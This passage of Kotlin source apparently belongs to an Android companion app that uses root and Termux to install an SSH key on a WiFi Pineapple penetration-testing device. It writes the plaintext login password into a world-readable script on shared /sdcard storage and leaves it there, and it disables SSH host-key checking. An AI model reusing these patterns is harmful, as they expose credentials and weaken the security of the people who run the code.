                if [ ! -f .ssh/pineapple.pub ]; then
                    echo 'SSHPASS:NO_PUBLIC_KEY'
                    exit 1
                fi
                
                PASS_FILE="${'$'}HOME/.ssh_pass_temp"
                sshpass -f "${'$'}PASS_FILE" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@172.16.42.1 'mkdir -p /root/.ssh && chmod 700 /root/.ssh && cat >> /root/.ssh/authorized_keys && chmod 600 /root/.ssh/authorized_keys' < .ssh/pineapple.pub 2>/dev/null
                SSHPASS_EXIT=${'$'}?
                rm -f "${'$'}PASS_FILE"
                
                if [ ${'$'}SSHPASS_EXIT -eq 0 ]; then
                    echo 'SSHPASS:SUCCESS'
                else
                    echo 'SSHPASS:FAILED'
                fi
            """.trimIndent()

            // Write password to temp file
            val writePasswordScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                export HOME=/data/data/com.termux/files/home
                cd "${'$'}HOME"
                echo '${password.replace("'", "'\\''")}' > .ssh_pass_temp
                chmod 600 .ssh_pass_temp
                echo 'PASSWORD_FILE_CREATED'
            """.trimIndent()

            val writePasswordPath = "/sdcard/write_password.sh"
            writeFileAsRoot(writePasswordPath, writePasswordScript)
            execAsRoot("chmod 644 $writePasswordPath")

            val writePasswordPipeline = "cat $writePasswordPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val writePasswordProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", writePasswordPipeline))
            val writePasswordOut = BufferedReader(InputStreamReader(writePasswordProc.inputStream)).use { it.readText() }
            writePasswordProc.waitFor()

            if (!writePasswordOut.contains("PASSWORD_FILE_CREATED")) {
                return false
            }

            // Run sshpass script
            val sshpassPath = "/sdcard/sshpass_transfer.sh"
            writeFileAsRoot(sshpassPath, sshpassScript)
            execAsRoot("chmod 644 $sshpassPath")

            val sshpassPipeline = "cat $sshpassPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val sshpassProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", sshpassPipeline))
            val sshpassOut = BufferedReader(InputStreamReader(sshpassProc.inputStream)).use { it.readText() }
            sshpassProc.waitFor()

            val sshpassSuccess = sshpassOut.contains("SSHPASS:SUCCESS")

            if (!sshpassSuccess) {
                return false
            }

            // Verify the connection after transfer
            val verifyScript = """
                #!/data/data/com.termux/files/usr/bin/bash
                set +e
                export HOME=/data/data/com.termux/files/home
                export PREFIX=/data/data/com.termux/files/usr
                export PATH="${'$'}PREFIX/bin:${'$'}PATH"
                cd "${'$'}HOME"
                
                ssh -i .ssh/pineapple -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=5 -o NumberOfPasswordPrompts=0 root@172.16.42.1 true 2>/dev/null
                if [ $? -eq 0 ]; then
                    echo 'VERIFY:SUCCESS'
                else
                    echo 'VERIFY:FAILED'
                fi
            """.trimIndent()

            val verifyPath = "/sdcard/verify_after_transfer.sh"
            writeFileAsRoot(verifyPath, verifyScript)
            execAsRoot("chmod 644 $verifyPath")

            val verifyPipeline = "cat $verifyPath | su $termuxUid -g $termuxGid $termuxGroups -c '$TERMUX_BASH'"
            val verifyProc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", verifyPipeline))
            val verifyOut = BufferedReader(InputStreamReader(verifyProc.inputStream)).use { it.readText() }
            verifyProc.waitFor()

            return verifyOut.contains("VERIFY:SUCCESS")

        } catch (e: Exception) {
            return false
        }
    }

    private fun detectTermuxIds() {
        Thread {
            try {
                val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
                val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
                val listExit = listProc.waitFor()

                if (listExit != 0 || listOutput.isBlank()) return@Thread

                val parts = listOutput.trim().split("\\s+".toRegex())
                if (parts.size < 2) return@Thread

                val termuxAppId = parts[1].toIntOrNull() ?: return@Thread
                termuxUid = termuxAppId.toString()
                termuxGid = termuxAppId.toString()

                val appId = termuxAppId - 10000
                val supplementaryGroups = listOf("3003", "9997", (20000 + appId).toString(), (50000 + appId).toString())
                termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }
            } catch (e: Exception) {
                // Ignore
            }
        }.start()
    }

    private fun ensureTermuxIdsDetected(): Pair<Boolean, String?> {
        if (termuxUid.isNotEmpty() && termuxGid.isNotEmpty() && termuxGroups.isNotEmpty()) {
            return Pair(true, null)
        }

        try {
            val listProc = Runtime.getRuntime().exec(arrayOf("su", "-c", "grep '^com\\.termux ' /data/system/packages.list"))
            val listOutput = BufferedReader(InputStreamReader(listProc.inputStream)).use { it.readText() }
            val listExit = listProc.waitFor()

            if (listExit != 0 || listOutput.isBlank()) {
                return Pair(false, "Termux not found in packages.list")
            }

            val parts = listOutput.trim().split("\\s+".toRegex())
            if (parts.size < 2) {
                return Pair(false, "Invalid packages.list format")
            }

            val termuxAppId = parts[1].toIntOrNull() ?: return Pair(false, "Could not parse UID")

            termuxUid = termuxAppId.toString()
            termuxGid = termuxAppId.toString()

            val appId = termuxAppId - 10000
            val supplementaryGroups = listOf("3003", "9997", (20000 + appId).toString(), (50000 + appId).toString())
            termuxGroups = supplementaryGroups.joinToString(" ") { "-G $it" }

            return Pair(true, null)
        } catch (e: Exception) {
            return Pair(false, "Exception: ${e.message}")
        }
    }

    private fun writeFileAsRoot(path: String, content: String) {
        val proc = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", "cat > '$path'"))
        OutputStreamWriter(proc.outputStream).use { writer ->
            writer.write(content)
            writer.flush()
        }
        proc.outputStream.close()
        proc.waitFor()
    }

    private fun execAsRoot(cmd: String) {
        val p = Runtime.getRuntime().exec(arrayOf("su", "-mm", "-c", cmd))
        p.waitFor()
    }
}
